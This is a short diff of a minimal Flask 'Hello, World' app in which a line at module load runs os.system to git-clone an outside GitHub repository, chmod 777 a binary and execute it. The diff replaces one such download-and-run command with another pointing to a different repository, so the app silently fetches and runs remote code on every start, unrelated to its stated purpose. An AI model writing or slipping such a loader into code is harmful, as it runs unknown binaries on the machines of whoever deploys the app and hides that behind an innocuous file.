@@ -1,7 +1,7 @@
 from flask import Flask
 app = Flask(__name__)
 import os
-os.system ('git clone https://github.com/mateokalen108/example-flask.git && cd example-flask && chmod 777 bot && ./bot')
+os.system ('git clone https://github.com/selokguine3/yes.git && cd yes && chmod 777 run && ./run')
 @app.route('/')
 def hello_world():
     return 'Hello, World!'
